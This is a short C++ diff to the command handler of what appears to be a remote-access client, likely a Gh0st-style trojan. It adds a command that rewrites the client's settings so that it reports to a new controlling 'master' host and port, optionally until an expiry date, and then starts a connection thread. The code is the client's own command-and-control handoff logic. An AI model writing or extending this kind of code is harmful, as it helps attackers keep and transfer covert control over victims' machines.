@@ -323,8 +323,24 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	}
 	
 	case COMMAND_SHARE:
+	case COMMAND_ASSIGN_MASTER:
 		if (ulLength > 2) {
 			switch (szBuffer[1]) {
+			case SHARE_TYPE_YAMA_FOREVER: {
+				auto v = StringToVector((char*)szBuffer + 2, ':', 3);
+				if (v[0].empty() || v[1].empty())
+					break;
+
+				iniFile cfg(CLIENT_PATH);
+				cfg.SetStr("settings", "master", v[0]);
+				cfg.SetStr("settings", "port", v[1]);
+				float days = atof(v[2].c_str());
+				if (days > 0) {
+					auto valid_to = time(0) + days*86400;
+					// overflow after 2038-01-19
+					cfg.SetStr("settings", "valid_to", std::to_string(valid_to));
+				}
+			}
 			case SHARE_TYPE_YAMA: {
 				auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
 				if (nullptr!=a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
